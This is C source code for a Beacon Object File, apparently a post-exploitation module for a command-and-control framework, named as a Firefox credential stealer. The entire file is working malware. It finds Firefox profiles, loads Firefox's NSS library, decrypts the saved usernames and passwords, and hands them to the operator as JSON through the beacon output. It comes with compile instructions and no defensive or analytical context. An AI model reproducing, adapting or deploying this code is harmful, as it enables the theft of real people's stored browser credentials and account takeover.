/*
 * ═══════════════════════════════════════════════════════════════
 *  ARES BOF — Firefox Credential Stealer (COFF Module)
 *
 *  Firefox uses NSS (Network Security Services) with key4.db
 *  (SQLite) and logins.json. Different from Chromium entirely.
 *
 *  Compile: gcc -c -w -O2 -o steal_firefox.o steal_firefox_bof.c
 *  Entry:   void go(char* args, int args_len)
 *
 *  Approach:
 *    1. Find Firefox profiles in %APPDATA%\Mozilla\Firefox\Profiles
 *    2. For each profile, read logins.json (contains URLs + encrypted creds)
 *    3. Load nss3.dll from Firefox install dir
 *    4. Use NSS PK11SDR_Decrypt to decrypt credentials
 *    5. Output JSON via BeaconPrintf
 * ═══════════════════════════════════════════════════════════════
 */

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <stdio.h>
#include <string.h>

/* BOF API */
extern void BeaconPrintf(int type, const char* fmt, ...);
extern void BeaconOutput(int type, const char* data, int len);

/* NSS types */
typedef enum { SECSuccess = 0, SECFailure = -1 } SECStatus;
typedef struct { unsigned int len; unsigned char *data; } SECItem;

/* NSS function typedefs */
typedef SECStatus (*fn_NSS_Init)(const char*);
typedef SECStatus (*fn_NSS_Shutdown)(void);
typedef SECStatus (*fn_PK11SDR_Decrypt)(SECItem*, SECItem*, void*);
typedef void      (*fn_SECITEM_FreeItem)(SECItem*, int);

/* Globals */
static HMODULE g_nss = NULL;
static fn_NSS_Init        p_NSS_Init = NULL;
static fn_NSS_Shutdown    p_NSS_Shutdown = NULL;
static fn_PK11SDR_Decrypt p_PK11SDR_Decrypt = NULL;
static fn_SECITEM_FreeItem p_SECITEM_FreeItem = NULL;

/* ── Base64 decode (custom — no CRT dependency) ── */
static const unsigned char b64_table[256] = {
    64,64,64,64,64,64,64,64,64,64,64,64,64,64,64,64,
    64,64,64,64,64,64,64,64,64,64,64,64,64,64,64,64,
    64,64,64,64,64,64,64,64,64,64,64,62,64,64,64,63,
    52,53,54,55,56,57,58,59,60,61,64,64,64,0,64,64,
    64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,
    15,16,17,18,19,20,21,22,23,24,25,64,64,64,64,64,
    64,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,
    41,42,43,44,45,46,47,48,49,50,51,64,64,64,64,64,
    64,64,64,64,64,64,64,64,64,64,64,64,64,64,64,64,
    64,64,64,64,64,64,64,64,64,64,64,64,64,64,64,64,
    64,64,64,64,64,64,64,64,64,64,64,64,64,64,64,64,
    64,64,64,64,64,64,64,64,64,64,64,64,64,64,64,64,
    64,64,64,64,64,64,64,64,64,64,64,64,64,64,64,64,
    64,64,64,64,64,64,64,64,64,64,64,64,64,64,64,64,
    64,64,64,64,64,64,64,64,64,64,64,64,64,64,64,64,
    64,64,64,64,64,64,64,64,64,64,64,64,64,64,64,64
};

static int bof_b64dec(const char* in, int in_len, unsigned char* out, int out_max) {
    int i = 0, j = 0;
    unsigned char buf[4];
    int buf_len = 0;
    
    for (i = 0; i < in_len && j < out_max; i++) {
        unsigned char c = b64_table[(unsigned char)in[i]];
        if (c == 64) continue; /* skip non-base64 */
        buf[buf_len++] = c;
        if (buf_len == 4) {
            if (j < out_max) out[j++] = (buf[0] << 2) | (buf[1] >> 4);
            if (j < out_max) out[j++] = (buf[1] << 4) | (buf[2] >> 2);
            if (j < out_max) out[j++] = (buf[2] << 6) | buf[3];
            buf_len = 0;
        }
    }
    if (buf_len >= 2 && j < out_max) {
        out[j++] = (buf[0] << 2) | (buf[1] >> 4);
        if (buf_len >= 3 && j < out_max)
            out[j++] = (buf[1] << 4) | (buf[2] >> 2);
    }
    return j;
}

/* ── Find Firefox install directory ── */
static BOOL find_firefox_dir(char* out, int max) {
    char pf[MAX_PATH];
    if (GetEnvironmentVariableA("PROGRAMFILES", pf, MAX_PATH) == 0) return FALSE;
    snprintf(out, max, "%s\\Mozilla Firefox", pf);
    if (GetFileAttributesA(out) != INVALID_FILE_ATTRIBUTES) return TRUE;
    
    /* Try x86 */
    if (GetEnvironmentVariableA("PROGRAMFILES(X86)", pf, MAX_PATH) == 0) return FALSE;
    snprintf(out, max, "%s\\Mozilla Firefox", pf);
    if (GetFileAttributesA(out) != INVALID_FILE_ATTRIBUTES) return TRUE;
    
    return FALSE;
}

/* ── Load NSS from Firefox directory ── */
static BOOL load_nss(const char* ff_dir) {
    /* nss3.dll depends on other DLLs in the Firefox dir */
    SetDllDirectoryA(ff_dir);
    
    char nss_path[MAX_PATH];
    snprintf(nss_path, MAX_PATH, "%s\\nss3.dll", ff_dir);
    g_nss = LoadLibraryA(nss_path);
    if (!g_nss) return FALSE;
    
    p_NSS_Init = (fn_NSS_Init)GetProcAddress(g_nss, "NSS_Init");
    p_NSS_Shutdown = (fn_NSS_Shutdown)GetProcAddress(g_nss, "NSS_Shutdown");
    p_PK11SDR_Decrypt = (fn_PK11SDR_Decrypt)GetProcAddress(g_nss, "PK11SDR_Decrypt");
    p_SECITEM_FreeItem = (fn_SECITEM_FreeItem)GetProcAddress(g_nss, "SECITEM_FreeItem");
    
    if (!p_NSS_Init || !p_PK11SDR_Decrypt) {
        FreeLibrary(g_nss);
        g_nss = NULL;
        return FALSE;
    }
    return TRUE;
}

/* ── Decrypt a base64-encoded NSS encrypted string ── */
static int nss_decrypt_b64(const char* b64_enc, char* out, int out_max) {
    unsigned char raw[4096];
    int raw_len = bof_b64dec(b64_enc, (int)strlen(b64_enc), raw, sizeof(raw));
    if (raw_len <= 0) return -1;
    
    SECItem input = { (unsigned int)raw_len, raw };
    SECItem output = { 0, NULL };
    
    SECStatus rv = p_PK11SDR_Decrypt(&input, &output, NULL);
    if (rv != SECSuccess) return -1;
    
    int copy = (int)output.len;
    if (copy >= out_max) copy = out_max - 1;
    memcpy(out, output.data, copy);
    out[copy] = '\0';
    
    if (p_SECITEM_FreeItem) p_SECITEM_FreeItem(&output, 0);
    return copy;
}

/* ── JSON string extract helper ── */
static const char* json_str(const char* json, const char* key, char* buf, int max) {
    char search[128];
    snprintf(search, sizeof(search), "\"%s\"", key);
    const char* pos = strstr(json, search);
    if (!pos) return NULL;
    pos = strchr(pos + strlen(search), ':');
    if (!pos) return NULL;
    while (*pos == ' ' || *pos == ':' || *pos == '\t') pos++;
    if (*pos != '"') return NULL;
    pos++; /* skip opening quote */
    int i = 0;
    while (*pos && *pos != '"' && i < max - 1) {
        if (*pos == '\\' && *(pos+1)) { pos++; }
        buf[i++] = *pos++;
    }
    buf[i] = '\0';
    return buf;
}

/* ── Read file ── */
static char* read_text_file(const char* path, DWORD* out_size) {
    HANDLE hf = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ|FILE_SHARE_WRITE,
                           NULL, OPEN_EXISTING, 0, NULL);
    if (hf == INVALID_HANDLE_VALUE) return NULL;
    DWORD sz = GetFileSize(hf, NULL);
    if (sz == 0 || sz > 20*1024*1024) { CloseHandle(hf); return NULL; }
    char* buf = (char*)HeapAlloc(GetProcessHeap(), 0, sz + 1);
    if (!buf) { CloseHandle(hf); return NULL; }
    DWORD read;
    ReadFile(hf, buf, sz, &read, NULL);
    CloseHandle(hf);
    buf[read] = '\0';
    *out_size = read;
    return buf;
}

/* ═══════════════════════════════════════════════════════
 *  BOF ENTRY POINT
 * ═══════════════════════════════════════════════════════ */
void go(char* args, int args_len)
{
    (void)args; (void)args_len;
    
    /* Find Firefox install dir */
    char ff_dir[MAX_PATH];
    if (!find_firefox_dir(ff_dir, MAX_PATH)) {
        BeaconPrintf(0, "[-] Firefox not installed");
        return;
    }
    
    /* Load NSS */
    if (!load_nss(ff_dir)) {
        BeaconPrintf(0, "[-] Failed to load nss3.dll from %s", ff_dir);
        return;
    }
    
    /* Find profiles */
    char appdata[MAX_PATH];
    if (GetEnvironmentVariableA("APPDATA", appdata, MAX_PATH) == 0) {
        BeaconPrintf(0, "[-] Cannot get APPDATA");
        goto cleanup;
    }
    
    char profiles_dir[MAX_PATH];
    snprintf(profiles_dir, MAX_PATH, "%s\\Mozilla\\Firefox\\Profiles", appdata);
    
    char json_out[32768];
    int off = 0;
    int total_creds = 0;
    off += snprintf(json_out + off, sizeof(json_out) - off, 
                    "{\"type\":\"firefox\",\"profiles\":[");
    
    /* Enumerate profile directories */
    char search[MAX_PATH];
    snprintf(search, MAX_PATH, "%s\\*", profiles_dir);
    WIN32_FIND_DATAA fd;
    HANDLE hFind = FindFirstFileA(search, &fd);
    if (hFind == INVALID_HANDLE_VALUE) {
        BeaconPrintf(0, "[-] No Firefox profiles found");
        goto cleanup;
    }
    
    int profile_count = 0;
    do {
        if (fd.cFileName[0] == '.') continue;
        if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) continue;
        
        char profile_path[MAX_PATH];
        snprintf(profile_path, MAX_PATH, "%s\\%s", profiles_dir, fd.cFileName);
        
        /* Check for logins.json */
        char logins_path[MAX_PATH];
        snprintf(logins_path, MAX_PATH, "%s\\logins.json", profile_path);
        if (GetFileAttributesA(logins_path) == INVALID_FILE_ATTRIBUTES) continue;
        
        /* Init NSS with this profile (loads key4.db) */
        if (p_NSS_Init(profile_path) != SECSuccess) continue;
        
        /* Read logins.json */
        DWORD logins_size;
        char* logins_data = read_text_file(logins_path, &logins_size);
        if (!logins_data) { p_NSS_Shutdown(); continue; }
        
        if (profile_count > 0) 
            off += snprintf(json_out + off, sizeof(json_out) - off, ",");
        off += snprintf(json_out + off, sizeof(json_out) - off,
                       "{\"profile\":\"%s\",\"creds\":[", fd.cFileName);
        
        /* Parse logins.json — find each login entry */
        int cred_count = 0;
        const char* cursor = logins_data;
        
        while ((cursor = strstr(cursor, "\"hostname\"")) != NULL && off < (int)sizeof(json_out) - 512) {
            char hostname[256] = {0};
            char enc_user[4096] = {0};
            char enc_pass[4096] = {0};
            
            json_str(cursor, "hostname", hostname, sizeof(hostname));
            json_str(cursor, "encryptedUsername", enc_user, sizeof(enc_user));
            json_str(cursor, "encryptedPassword", enc_pass, sizeof(enc_pass));
            
            if (enc_user[0] && enc_pass[0]) {
                char dec_user[512] = {0}, dec_pass[512] = {0};
                int u_ok = nss_decrypt_b64(enc_user, dec_user, sizeof(dec_user));
                int p_ok = nss_decrypt_b64(enc_pass, dec_pass, sizeof(dec_pass));
                
                if (u_ok > 0 || p_ok > 0) {
                    if (cred_count > 0)
                        off += snprintf(json_out + off, sizeof(json_out) - off, ",");
                    off += snprintf(json_out + off, sizeof(json_out) - off,
                        "{\"url\":\"%s\",\"user\":\"%s\",\"pass\":\"%s\"}",
                        hostname, dec_user, dec_pass);
                    cred_count++;
                    total_creds++;
                }
                /* Wipe decrypted */
                memset(dec_user, 0, sizeof(dec_user));
                memset(dec_pass, 0, sizeof(dec_pass));
            }
            cursor++; /* advance past current match */
        }
        
        off += snprintf(json_out + off, sizeof(json_out) - off, "]}");
        profile_count++;
        
        HeapFree(GetProcessHeap(), 0, logins_data);
        p_NSS_Shutdown();
        
    } while (FindNextFileA(hFind, &fd) && off < (int)sizeof(json_out) - 256);
    
    FindClose(hFind);
    
    off += snprintf(json_out + off, sizeof(json_out) - off, 
                    "],\"total\":%d}", total_creds);
    
    BeaconOutput(0, json_out, off);
    BeaconPrintf(0, "\n[+] Firefox steal: %d creds from %d profiles", 
                 total_creds, profile_count);

cleanup:
    if (g_nss) {
        FreeLibrary(g_nss);
        g_nss = NULL;
    }
    SetDllDirectoryA(NULL); /* Reset DLL search path */
}
